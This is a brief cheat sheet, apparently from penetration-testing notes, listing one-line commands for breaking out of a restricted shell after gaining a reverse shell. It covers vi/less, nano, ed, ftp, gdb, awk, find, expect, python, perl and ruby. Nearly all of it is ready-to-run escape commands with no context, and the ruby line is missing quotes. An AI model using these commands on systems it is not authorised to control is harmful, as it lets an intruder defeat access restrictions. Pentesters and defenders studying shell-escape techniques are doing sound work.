## Breaking out of limited reverse shell

```
vi, vim, man, less, more
    :set shell=/bin/bash
    :shell
    # or
    :!/bin/bash
nano
    # Control - R, Control - X
    ^R^X
    reset; sh 1>&0 2>&0
ed 
    !'/bin/sh'
common tools
    # cp
    cp /bin/sh /current/PATH

    # ftp
    ftp
    ftp>!/bin/sh

    # gdb
    gdb
    (gdb)!/bin/sh

    # awk
    awk 'BEGIN {system("/bin/bash")}'

    # find
    find / -name bleh -exec /bin/bash \;

    # expect
    expect
    spawn sh   
scripting languages
    # python
    python -c 'import os;os.system("/bin/bash")'

    # perl
    perl -e 'exec "/bin/sh";'

    # ruby
    ruby -e 'exec /bin/sh' 
``` 